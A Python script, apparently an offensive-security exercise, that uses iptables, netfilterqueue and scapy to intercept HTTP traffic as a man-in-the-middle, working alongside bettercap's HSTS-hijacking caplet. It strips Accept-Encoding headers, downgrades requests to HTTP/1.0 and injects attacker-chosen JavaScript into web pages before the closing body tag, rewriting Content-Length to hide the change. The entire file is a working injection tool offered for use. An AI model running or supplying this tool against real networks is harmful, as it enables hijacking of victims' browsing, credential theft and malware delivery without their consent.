#!/usr/bin/env python3

import re
import optparse
import subprocess
import netfilterqueue
import scapy.all as scapy


def get_options():
    parser = optparse.OptionParser()

    parser.add_option("-s",  "--script", dest="script", help="Enter script that you want to inject,\nEXAMPLE: alert('test');")

    options = parser.parse_args()[0]

    if not options.script:
        parser.error("\033[91m[-] Please enter a script that you want to inject. Use --help for more info.")
    return options

def prepare_iptables():
    # subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)  # without bettercap

    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True) # with bettercap hstshijack caplet
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True) # with bettercap hstshijack caplet

def set_load(packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        try:
            load = scapy_packet[scapy.Raw].load.decode()

            if scapy_packet[scapy.TCP].dport == 8080: # Change to 80 if not using bettercap hstshijack
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

                if "HTTP/1.1" in load:
                    load = load.replace("HTTP/1.1", "HTTP/1.0")

            elif scapy_packet[scapy.TCP].sport == 8080: # Change to 80 if not using bettercap hstshijack
                print("\033[1;32;40m[+] Injecting code.")
                injection_code = options.script
                load = load.replace("</body>", injection_code + "</body>")

                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)

                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)

                    load = load.replace(content_length, str(new_content_length))

            if load != str(scapy_packet[scapy.Raw].load):
                modified_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(modified_packet))

        except UnicodeError:
            pass

    packet.accept()

def restore():
    print("\n\033[1;35;40m[+] Detected CTRL + C. Quiting.... Please wait!")
    subprocess.call("iptables --flush", shell=True)


options = get_options()
prepare_iptables()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    restore()
